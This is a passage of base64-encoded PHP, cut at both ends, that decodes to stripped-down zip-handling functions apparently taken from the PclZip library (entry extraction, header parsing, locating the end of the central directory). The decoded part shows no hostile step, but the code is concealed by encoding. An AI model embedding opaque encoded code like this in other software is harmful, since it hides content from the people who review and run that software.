mFyeV9kYXRhID0gcGFjaygndmExYTFWYTFhMScsIDB4OGIxZiwgQ2hyKCRwX2VudHJ5Wydjb21wcmVzc2lvbiddKSwgQ2hyKDB4MDApLCB0aW1lKCksIENocigweDAwKSwgQ2hyKDMpKTsNCiAgQGZ3cml0ZSgkdl9kZXN0X2ZpbGUsICR2X2JpbmFyeV9kYXRhLCAxMCk7DQoNCiAgJHZfc2l6ZSA9ICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBwYWNrKCdWVicsICRwX2VudHJ5WydjcmMnXSwgJHBfZW50cnlbJ3NpemUnXSk7DQogIEBmd3JpdGUoJHZfZGVzdF9maWxlLCAkdl9iaW5hcnlfZGF0YSwgOCk7DQoNCiAgQGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KDQogIGlmICgoJHZfZGVzdF9maWxlID0gQGZvcGVuKCRwX2VudHJ5WydmaWxlbmFtZSddLCAnd2InKSkgPT0gMCkgew0KICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJ3cml0ZV9lcnJvciI7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfc3JjX2ZpbGUgPSBAZ3pvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAncmInKSkgPT0gMCkgew0KICAgIEBmY2xvc2UoJHZfZGVzdF9maWxlKTsNCiAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAicmVhZF9lcnJvciI7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl9nemlwX3RlbXBfbmFtZS4nXCcgaW4gYmluYXJ5IHJlYWQgbW9kZScpOw0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCg0KICAkdl9zaXplID0gJHBfZW50cnlbJ3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZ3pyZWFkKCR2X3NyY19maWxlLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHZfZGVzdF9maWxlLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCiAgQGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KICBAZ3pjbG9zZSgkdl9zcmNfZmlsZSk7DQoNCiAgQHVubGluaygkdl9nemlwX3RlbXBfbmFtZSk7DQogIA0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RXh0cmFjdEZpbGVJbk91dHB1dCgmJHBfZW50cnksICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZEZpbGVIZWFkZXIoJHZfaGVhZGVyKSkgIT0gMSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KDQogIGlmICgkdGhpcy0+cHJpdkNoZWNrRmlsZUhlYWRlcnMoJHZfaGVhZGVyLCAkcF9lbnRyeSkgIT0gMSkgew0KICB9DQoNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXSkpIHsNCg0KICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2VudHJ5LCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1RdKFBDTFpJUF9DQl9QUkVfRVhUUkFDVCwgJHZfbG9jYWxfaGVhZGVyKTsNCiAgICBpZiAoJHZfcmVzdWx0ID09IDApIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJza2lwcGVkIjsNCiAgICAgICR2X3Jlc3VsdCA9IDE7DQogICAgfQ0KDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAiYWJvcnRlZCI7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCg0KICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gJHZfbG9jYWxfaGVhZGVyWydmaWxlbmFtZSddOw0KICB9DQoNCg0KICBpZiAoJHBfZW50cnlbJ3N0YXR1cyddID09ICdvaycpIHsNCg0KICAgIGlmICghKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkpIHsNCiAgICAgIGlmICgkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ10gPT0gJHBfZW50cnlbJ3NpemUnXSkgew0KDQogICAgICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ10pOw0KDQogICAgICAgIGVjaG8gJHZfYnVmZmVyOw0KICAgICAgICB1bnNldCgkdl9idWZmZXIpOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQoNCiAgICAgICAgJHZfYnVmZmVyID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgICAgIA0KICAgICAgICAkdl9maWxlX2NvbnRlbnQgPSBnemluZmxhdGUoJHZfYnVmZmVyKTsNCiAgICAgICAgdW5zZXQoJHZfYnVmZmVyKTsNCg0KICAgICAgICBlY2hvICR2X2ZpbGVfY29udGVudDsNCiAgICAgICAgdW5zZXQoJHZfZmlsZV9jb250ZW50KTsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAiYWJvcnRlZCIpIHsNCiAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQp9DQoNCiAgZWxzZWlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfZW50cnksICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKFBDTFpJUF9DQl9QT1NUX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkV4dHJhY3RGaWxlQXNTdHJpbmcoJiRwX2VudHJ5LCAmJHBfc3RyaW5nLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfaGVhZGVyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCg0KICBpZiAoJHRoaXMtPnByaXZDaGVja0ZpbGVIZWFkZXJzKCR2X2hlYWRlciwgJHBfZW50cnkpICE9IDEpIHsNCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9lbnRyeSwgJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICR2X3Jlc3VsdCA9ICRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXShQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQogICAgaWYgKCR2X3Jlc3VsdCA9PSAwKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCiAgICANCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJhYm9ydGVkIjsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KDQogICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10gPSAkdl9sb2NhbF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQogIH0NCg0KDQogIGlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogICAgaWYgKCEoKCRwX2VudHJ5WydleHRlcm5hbCddJjB4MDAwMDAwMTApPT0weDAwMDAwMDEwKSkgew0KICAgICAgaWYgKCRwX2VudHJ5Wydjb21wcmVzc2lvbiddID09IDApIHsNCg0KICAgICAgICAkcF9zdHJpbmcgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KDQogICAgICAgICR2X2RhdGEgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCiAgICAgICAgDQogICAgICAgIGlmICgoJHBfc3RyaW5nID0gQGd6aW5mbGF0ZSgkdl9kYXRhKSkgPT09IEZBTFNFKSB7DQogICAgICAgIH0NCiAgICAgIH0NCg0KICAgIH0NCiAgICBlbHNlIHsNCiAgICB9DQogICAgDQogIH0NCg0KCWlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gImFib3J0ZWQiKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQoJfQ0KDQogIGVsc2VpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXSkpIHsNCg0KICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2VudHJ5LCAkdl9sb2NhbF9oZWFkZXIpOw0KICAgIA0KICAgICR2X2xvY2FsX2hlYWRlclsnY29udGVudCddID0gJHBfc3RyaW5nOw0KICAgICRwX3N0cmluZyA9ICcnOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXShQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNULCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHBfc3RyaW5nID0gJHZfbG9jYWxfaGVhZGVyWydjb250ZW50J107DQogICAgdW5zZXQoJHZfbG9jYWxfaGVhZGVyWydjb250ZW50J10pOw0KDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZSZWFkRmlsZUhlYWRlcigmJHBfaGVhZGVyKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0KTsNCiAgJHZfZGF0YSA9IHVucGFjaygnVmlkJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogIGlmICgkdl9kYXRhWydpZCddICE9IDB4MDQwMzRiNTApDQogIHsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ0ludmFsaWQgYXJjaGl2ZSBzdHJ1Y3R1cmUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAyNik7DQoNCiAgaWYgKHN0cmxlbigkdl9iaW5hcnlfZGF0YSkgIT0gMjYpDQogIHsNCiAgICAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10gPSAiIjsNCiAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gImludmFsaWRfaGVhZGVyIjsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIkludmFsaWQgYmxvY2sgc2l6ZSA6ICIuc3RybGVuKCR2X2JpbmFyeV9kYXRhKSk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2RhdGEgPSB1bnBhY2soJ3Z2ZXJzaW9uL3ZmbGFnL3Zjb21wcmVzc2lvbi92bXRpbWUvdm1kYXRlL1ZjcmMvVmNvbXByZXNzZWRfc2l6ZS9Wc2l6ZS92ZmlsZW5hbWVfbGVuL3ZleHRyYV9sZW4nLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgJHBfaGVhZGVyWydmaWxlbmFtZSddID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfZGF0YVsnZmlsZW5hbWVfbGVuJ10pOw0KDQogIGlmICgkdl9kYXRhWydleHRyYV9sZW4nXSAhPSAwKSB7DQogICAgJHBfaGVhZGVyWydleHRyYSddID0gZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfZGF0YVsnZXh0cmFfbGVuJ10pOw0KICB9DQogIGVsc2Ugew0KICAgICRwX2hlYWRlclsnZXh0cmEnXSA9ICcnOw0KICB9DQoNCiAgJHBfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddID0gJHZfZGF0YVsndmVyc2lvbiddOw0KICAkcF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gPSAkdl9kYXRhWydjb21wcmVzc2lvbiddOw0KICAkcF9oZWFkZXJbJ3NpemUnXSA9ICR2X2RhdGFbJ3NpemUnXTsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9ICR2X2RhdGFbJ2NvbXByZXNzZWRfc2l6ZSddOw0KICAkcF9oZWFkZXJbJ2NyYyddID0gJHZfZGF0YVsnY3JjJ107DQogICRwX2hlYWRlclsnZmxhZyddID0gJHZfZGF0YVsnZmxhZyddOw0KICAkcF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddID0gJHZfZGF0YVsnZmlsZW5hbWVfbGVuJ107DQoNCiAgJHBfaGVhZGVyWydtZGF0ZSddID0gJHZfZGF0YVsnbWRhdGUnXTsNCiAgJHBfaGVhZGVyWydtdGltZSddID0gJHZfZGF0YVsnbXRpbWUnXTsNCiAgaWYgKCRwX2hlYWRlclsnbWRhdGUnXSAmJiAkcF9oZWFkZXJbJ210aW1lJ10pDQogIHsNCiAgICAkdl9ob3VyID0gKCRwX2hlYWRlclsnbXRpbWUnXSAmIDB4RjgwMCkgPj4gMTE7DQogICAgJHZfbWludXRlID0gKCRwX2hlYWRlclsnbXRpbWUnXSAmIDB4MDdFMCkgPj4gNTsNCiAgICAkdl9zZWNvbmRlID0gKCRwX2hlYWRlclsnbXRpbWUnXSAmIDB4MDAxRikqMjsNCg0KICAgICR2X3llYXIgPSAoKCRwX2hlYWRlclsnbWRhdGUnXSAmIDB4RkUwMCkgPj4gOSkgKyAxOTgwOw0KICAgICR2X21vbnRoID0gKCRwX2hlYWRlclsnbWRhdGUnXSAmIDB4MDFFMCkgPj4gNTsNCiAgICAkdl9kYXkgPSAkcF9oZWFkZXJbJ21kYXRlJ10gJiAweDAwMUY7DQoNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSBAbWt0aW1lKCR2X2hvdXIsICR2X21pbnV0ZSwgJHZfc2Vjb25kZSwgJHZfbW9udGgsICR2X2RheSwgJHZfeWVhcik7DQoNCiAgfQ0KICBlbHNlDQogIHsNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSB0aW1lKCk7DQogIH0NCg0KDQogICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPSAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQoNCiAgJHBfaGVhZGVyWydzdGF0dXMnXSA9ICJvayI7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdlJlYWRDZW50cmFsRmlsZUhlYWRlcigmJHBfaGVhZGVyKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0KTsNCiAgJHZfZGF0YSA9IHVucGFjaygnVmlkJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogIGlmICgkdl9kYXRhWydpZCddICE9IDB4MDIwMTRiNTApDQogIHsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ0ludmFsaWQgYXJjaGl2ZSBzdHJ1Y3R1cmUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0Mik7DQoNCiAgaWYgKHN0cmxlbigkdl9iaW5hcnlfZGF0YSkgIT0gNDIpDQogIHsNCiAgICAkcF9oZWFkZXJbJ2ZpbGVuYW1lJ10gPSAiIjsNCiAgICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gImludmFsaWRfaGVhZGVyIjsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgIkludmFsaWQgYmxvY2sgc2l6ZSA6ICIuc3RybGVuKCR2X2JpbmFyeV9kYXRhKSk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICRwX2hlYWRlciA9IHVucGFjaygndnZlcnNpb24vdnZlcnNpb25fZXh0cmFjdGVkL3ZmbGFnL3Zjb21wcmVzc2lvbi92bXRpbWUvdm1kYXRlL1ZjcmMvVmNvbXByZXNzZWRfc2l6ZS9Wc2l6ZS92ZmlsZW5hbWVfbGVuL3ZleHRyYV9sZW4vdmNvbW1lbnRfbGVuL3ZkaXNrL3ZpbnRlcm5hbC9WZXh0ZXJuYWwvVm9mZnNldCcsICR2X2JpbmFyeV9kYXRhKTsNCg0KICBpZiAoJHBfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSAhPSAwKQ0KICAgICRwX2hlYWRlclsnZmlsZW5hbWUnXSA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnZmlsZW5hbWVfbGVuJ10pOw0KICBlbHNlDQogICAgJHBfaGVhZGVyWydmaWxlbmFtZSddID0gJyc7DQoNCiAgaWYgKCRwX2hlYWRlclsnZXh0cmFfbGVuJ10gIT0gMCkNCiAgICAkcF9oZWFkZXJbJ2V4dHJhJ10gPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9oZWFkZXJbJ2V4dHJhX2xlbiddKTsNCiAgZWxzZQ0KICAgICRwX2hlYWRlclsnZXh0cmEnXSA9ICcnOw0KDQogIGlmICgkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10gIT0gMCkNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnQnXSA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSk7DQogIGVsc2UNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnQnXSA9ICcnOw0KDQogIGlmICgxKQ0KICB7DQogICAgJHZfaG91ciA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweEY4MDApID4+IDExOw0KICAgICR2X21pbnV0ZSA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweDA3RTApID4+IDU7DQogICAgJHZfc2Vjb25kZSA9ICgkcF9oZWFkZXJbJ210aW1lJ10gJiAweDAwMUYpKjI7DQoNCiAgICAkdl95ZWFyID0gKCgkcF9oZWFkZXJbJ21kYXRlJ10gJiAweEZFMDApID4+IDkpICsgMTk4MDsNCiAgICAkdl9tb250aCA9ICgkcF9oZWFkZXJbJ21kYXRlJ10gJiAweDAxRTApID4+IDU7DQogICAgJHZfZGF5ID0gJHBfaGVhZGVyWydtZGF0ZSddICYgMHgwMDFGOw0KDQogICAgJHBfaGVhZGVyWydtdGltZSddID0gQG1rdGltZSgkdl9ob3VyLCAkdl9taW51dGUsICR2X3NlY29uZGUsICR2X21vbnRoLCAkdl9kYXksICR2X3llYXIpOw0KDQogIH0NCiAgZWxzZQ0KICB7DQogICAgJHBfaGVhZGVyWydtdGltZSddID0gdGltZSgpOw0KICB9DQoNCiAgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSA9ICRwX2hlYWRlclsnZmlsZW5hbWUnXTsNCg0KICAkcF9oZWFkZXJbJ3N0YXR1cyddID0gJ29rJzsNCg0KICBpZiAoc3Vic3RyKCRwX2hlYWRlclsnZmlsZW5hbWUnXSwgLTEpID09ICcvJykgew0KICAgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSA9IDB4MDAwMDAwMTA7DQogIH0NCg0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZDaGVja0ZpbGVIZWFkZXJzKCYkcF9sb2NhbF9oZWFkZXIsICYkcF9jZW50cmFsX2hlYWRlcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCglpZiAoJHBfbG9jYWxfaGVhZGVyWydmaWxlbmFtZSddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydmaWxlbmFtZSddKSB7DQoJfQ0KCWlmICgkcF9sb2NhbF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10gIT0gJHBfY2VudHJhbF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10pIHsNCgl9DQoJaWYgKCRwX2xvY2FsX2hlYWRlclsnZmxhZyddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydmbGFnJ10pIHsNCgl9DQoJaWYgKCRwX2xvY2FsX2hlYWRlclsnY29tcHJlc3Npb24nXSAhPSAkcF9jZW50cmFsX2hlYWRlclsnY29tcHJlc3Npb24nXSkgew0KCX0NCglpZiAoJHBfbG9jYWxfaGVhZGVyWydtdGltZSddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydtdGltZSddKSB7DQoJfQ0KCWlmICgkcF9sb2NhbF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddICE9ICRwX2NlbnRyYWxfaGVhZGVyWydmaWxlbmFtZV9sZW4nXSkgew0KCX0NCg0KCWlmICgoJHBfbG9jYWxfaGVhZGVyWydmbGFnJ10gJiA4KSA9PSA4KSB7DQogICAgICAgICRwX2xvY2FsX2hlYWRlclsnc2l6ZSddID0gJHBfY2VudHJhbF9oZWFkZXJbJ3NpemUnXTsNCiAgICAgICAgJHBfbG9jYWxfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9ICRwX2NlbnRyYWxfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXTsNCiAgICAgICAgJHBfbG9jYWxfaGVhZGVyWydjcmMnXSA9ICRwX2NlbnRyYWxfaGVhZGVyWydjcmMnXTsNCgl9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdlJlYWRFbmRDZW50cmFsRGlyKCYkcF9jZW50cmFsX2RpcikNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfc2l6ZSA9IGZpbGVzaXplKCR0aGlzLT56aXBuYW1lKTsNCiAgQGZzZWVrKCR0aGlzLT56aXBfZmQsICR2X3NpemUpOw0KICBpZiAoQGZ0ZWxsKCR0aGlzLT56aXBfZmQpICE9ICR2X3NpemUpDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0JBRF9GT1JNQVQsICdVbmFibGUgdG8gZ28gdG8gdGhlIGVuZCBvZiB0aGUgYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnJyk7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X2ZvdW5kID0gMDsNCiAgaWYgKCR2X3NpemUgPiAyNikgew0KICAgIEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9zaXplLTIyKTsNCiAgICBpZiAoKCR2X3BvcyA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKSkgIT0gKCR2X3NpemUtMjIpKQ0KICAgIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ1VuYWJsZSB0byBzZWVrIGJhY2sgdG8gdGhlIG1pZGRsZSBvZiB0aGUgYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnJyk7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICR2X2JpbmFyeV9kYXRhID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsIDQpOw0KICAgICR2X2RhdGEgPSBAdW5wYWNrKCdWaWQnLCAkdl9iaW5hcnlfZGF0YSk7DQoNCiAgICBpZiAoJHZfZGF0YVsnaWQnXSA9PSAweDA2MDU0YjUwKSB7DQogICAgICAkdl9mb3VuZCA9IDE7DQogICAgfQ0KDQogICAgJHZfcG9zID0gZnRlbGwoJHRoaXMtPnppcF9mZCk7DQogIH0NCg0KICBpZiAoISR2X2ZvdW5kKSB7DQogICAgaWYgKCR2X21heGltdW1fc2l6ZSA+ICR2X3NpemUpDQogICAgICAkdl9tYXhpbXVtX3NpemUgPSAkdl9zaXplOw0KICAgIEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9zaXplLSR2X21heGltdW1fc2l6ZSk7DQogICAgaWYgKEBmdGVsbCgkdGhpcy0+emlwX2ZkKSAhPSAoJHZfc2l6ZS0kdl9tYXhpbXVtX3NpemUpKQ0KICAgIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCwgJ1VuYWJsZSB0byBzZWVrIGJhY2sgdG8gdGhlIG1pZGRsZSBvZiB0aGUgYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnJyk7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICR2X3BvcyA9IGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KICAgICR2X2J5dGVzID0gMHgwMDAwMDAwMDsNCiAgICB3aGlsZSAoJHZfcG9zIDwgJHZfc2l6ZSkNCiAgICB7DQogICAgICAkdl9ieXRlID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsIDEpOw0KDQogICAgICAkdl9ieXRlcyA9ICggKCR2X2J5dGVzICYgMHhGRkZGRkYpIDw8IDgpIHwgT3JkKCR2X2J5dGUpOyANCg0KICAgICAgaWYgKCR2X2J5dGVzID09IDB4NTA0YjA1MDYpDQogICAgICB7DQogICAgICAgICR2X3BvcysrOw0KICAgICAgICBicmVhazsNCiAgICAgIH0NCg0KICAgICAgJHZfcG9zKys7DQogICAgfQ0KDQogICAgaWYgKCR2X3BvcyA9PSAkdl9zaXplKQ0KICAgIHsNCg0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9CQURfRk9STUFULCAiVW5hYmxlIHRvIGZpbmQgRW5kIG9mIENlbnRyYWwgRGlyIFJlY29yZCBzaWduYXR1cmUiKTsNCg0KICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgfQ0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBmcmVhZCgkdGhpcy0+eml